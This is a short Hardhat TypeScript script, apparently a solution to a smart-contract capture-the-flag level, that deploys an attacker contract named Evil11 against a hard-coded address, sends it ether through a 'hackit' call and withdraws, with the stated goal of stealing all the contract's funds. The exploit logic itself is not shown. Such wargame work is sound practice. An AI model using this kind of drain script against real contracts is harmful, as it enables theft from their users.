import { ethers } from "hardhat";
import { Evil11__factory } from "../typechain-types";

async function main() {
  // The goal of this level is for you to steal all the funds from the contract.

  let tx; // will have to wait for each tx

  let [deployer] = await ethers.getSigners();
  let contract = "0xd4b7496Add3b7A83482cd81E5CF8F5839Ad7AECF";

  let evil = await new Evil11__factory(deployer).deploy(contract);

  tx = await evil.hackit({
    value: ethers.utils.parseEther("0.001"),
    gasLimit: 200_000,
  });
  await tx.wait();

  tx = await evil.withdraw();
  await tx.wait();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
